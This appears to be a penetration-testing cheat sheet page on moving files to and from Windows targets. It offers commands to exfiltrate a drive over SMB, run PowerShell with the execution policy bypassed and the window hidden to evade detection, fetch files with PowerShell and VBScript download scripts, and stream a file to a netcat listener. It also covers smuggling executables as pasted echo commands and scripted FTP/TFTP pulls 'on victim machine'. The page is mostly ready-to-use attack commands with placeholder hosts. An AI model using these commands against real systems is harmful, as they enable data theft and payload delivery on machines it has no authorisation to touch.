---
layout: default
title: Windows
parent: File Transfers
---

# Windows File Transfers
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## SMB
Exfill files recursively
```powershell
xcopy /c /h /r /s /y <source> <smb destination>
```
- e.g. `C:\*`

---

## PowerShell
Running PowerShell commands/files
```powershell
powershell -ep bypass -nol -noni -nop -Command <command>
powershell -ep bypass -nol -noni -nop -File <file>
```
- `-ep` sets the default execution policy for the current session, but does not override the value set in the registry
- `-nol` hides the copyright banner at startup
- `-noni` does not present an interactive prompt to the user
- `-nop` does not load the Windows PowerShell profile
- Can additionally add `-w hidden` to hide the window
- Note; some detection just greps for these args

Paste into terminal to create `wget.ps1` script
```powershell
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "<url>" >> wget.ps1
echo $file = "<output file>" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
```

```powershell
powershell -ep bypass -nol -noni -nop wget.ps1
```

One-liners (first is same as above pasted script)
```powershell
(New-Object System.Net.WebClient).DownloadFile(<url>, <output>)         # Fast, but no progress bar
(New-Object System.Net.WebClient).DownloadFileAsync(<url>, <output>)    # As above, but asynchronous
Invoke-WebRequest -Uri <url> -OutFile <output>                          # Easy, progress bar, but very slow
Start-BitsTransfer -Source <url> -Destination <output> [-Asynchronous]  # Fastest, asynchronous, progress bar, but BITS may not be enabled
```

PowerShell one-liner to send file to NetCat
```powershell
$h="<host>";$p="<port>";$data=Get-Content -Path "<file>";$tcp=New-Object System.Net.Sockets.TcpClient($h,$p);$w=New-Object System.IO.StreamWriter($tcp).GetStream();foreach($l in $data){$w.WriteLine($l)};$w.Flush();$w.Close();$tcp.Close();
```

---

## VBScript
Paste into terminal to create `wget.vbs` script
```powershell
echo 'strUrl = WScript.Arguments.Item(0)' > wget.vbs
echo 'StrFile = WScript.Arguments.Item(1)' >> wget.vbs
echo 'Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0' >> wget.vbs
echo 'Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0' >> wget.vbs
echo 'Const HTTPREQUEST_PROXYSETTING_DIRECT = 1' >> wget.vbs
echo 'Const HTTPREQUEST_PROXYSETTING_PROXY = 2' >> wget.vbs
echo 'Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts' >> wget.vbs
echo 'Err.Clear' >> wget.vbs
echo 'Set http = Nothing' >> wget.vbs
echo 'Set http = CreateObject("WinHttp.WinHttpRequest.5.1")' >> wget.vbs
echo 'If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")' >> wget.vbs
echo 'If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")' >> wget.vbs
echo 'If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")' >> wget.vbs
echo 'http.Open "GET", strURL, False' >> wget.vbs
echo 'http.Send' >> wget.vbs
echo 'varByteArray = http.ResponseBody' >> wget.vbs
echo 'Set http = Nothing' >> wget.vbs
echo 'Set fs = CreateObject("Scripting.FileSystemObject")' >> wget.vbs
echo 'Set ts = fs.CreateTextFile(StrFile, True)' >> wget.vbs
echo 'strData = ""' >> wget.vbs
echo 'strBuffer = ""' >> wget.vbs
echo 'For lngCounter = 0 to UBound(varByteArray)' >> wget.vbs
echo 'ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))' >> wget.vbs
echo 'Next' >> wget.vbs
echo 'ts.Close' >> wget.vbs
```

```powershell
cscript wget.vbs <url> <output>
```

---

## Convert File to Base64
Base 64 Encoding
```powershell
certutil -encode <input> <output>
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("<UTF8 string>")) > <b64 output>
```

Base 64 Decoding
```powershell
certutil -decode <input> <output>
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<b64 string>")) > <UTF8 output>
```

---

## exe2hex (debug.exe or PowerShell)
```shell
python3 exe2hex.py -x <exe> [-b <bat output>] [-p <ps output>] [-cc]        # From file
cat <exe> | python3 exe2hex.py -s [-b <bat output>] [-p <ps output>] [-cc]  # From stdin
```
- Paste output into target terminal to create file on target machine
- `-b` output to bat file (uses `debug.exe`, only 32-bit OSes, no file size limit)
- `-p` output to ps file (supports 64-bit, is not a ps script, only calls ps at end)
- `-c` or `-cc` for compression level
- `-t` creates an Expect file to automate a Telnet session
- `-w` creates an Expect file to automate a WinEXE session
- When using over **Telnet** or **WinEXE**, 100+ lines can be unpredictable including incorrect ordering or character ommission:
    - Use [Expect](http://expect.sourceforge.net/); available on most distros `apt install expect`
    - Further details found here <https://github.com/g0tmi1k/exe2hex/blob/master/README.md>

---

## exe2bat (debug.exe)
- Only works on 32-bit systems and file must be at most 64kB
- If > 64kB, use a compression tool such as `upx`
```shell
upx --ultra-brute <file>
```

Convert .exe to series of echo commands using `exe2bat`, paste into target terminal to create file on target machine
```shell
wine exe2bat.exe <input exe> <output text file>  # Remove Wine if on Windows
```

---

## FTP
- Often enabled, but interactive so need to provide text file with FTP commands instead

Setup FTP server e.g. vsftpd, pureftpd or proftpd
```shell
vim /etc/vsftpd.conf  # anonymous_enable=YES
service vsftpd start  # Default anonymous directory is /srv/ftp or /var/ftp
```

Paste into victim terminal (anonymous : anonymous for anonymous login)
```powershell
echo open <ip> > ftp.txt
echo <username> >> ftp.txt
echo <password> >> ftp.txt
echo bin >> ftp.txt
echo GET <remote file> >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

---

## TFTP
- Enabled by default up to Win 2003/XP
- UDP based, often blocked by corporate egress rules
- Non-interactive, easy to setup

```powershell
atftpd --daemon --port 69 <directory>  # Setup server on attacker's machine
tftp -i <ip> GET <remote file>  # On victim machine
```